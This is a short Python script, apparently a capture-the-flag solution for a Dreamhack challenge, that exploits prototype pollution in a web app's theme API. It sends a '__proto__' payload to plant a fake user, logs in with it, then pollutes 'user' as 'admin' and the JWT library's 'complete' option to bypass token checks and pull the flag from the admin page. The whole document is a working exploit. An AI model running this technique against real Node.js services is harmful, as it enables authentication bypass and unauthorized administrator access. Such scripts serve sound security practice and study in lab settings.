import requests
import re

url = "http://host8.dreamhack.games:20515"

s = requests.Session()

def pollute(payload):
    res = s.post(f'{url}/api/theme', json={
        "base": "light",
        "customizations": {
            '__proto__': payload
        }
    })

    if res.json()['success']:
        print("> Pollution succeeded")    

# get user
username = 'hacker'
pollute({username: username})

res = s.post(f'{url}/api/login', json={ 'username': username, 'password': username })

token = res.json()['token']

# pollute decoded.user and jsonwebtoken
pollute({ 'user': 'admin', "complete": True })

res = requests.get(f'{url}/admin', cookies={ 'token': token })

flag = re.findall(r'(WaRP{.+})', res.text)[0]
print("Flag:", flag)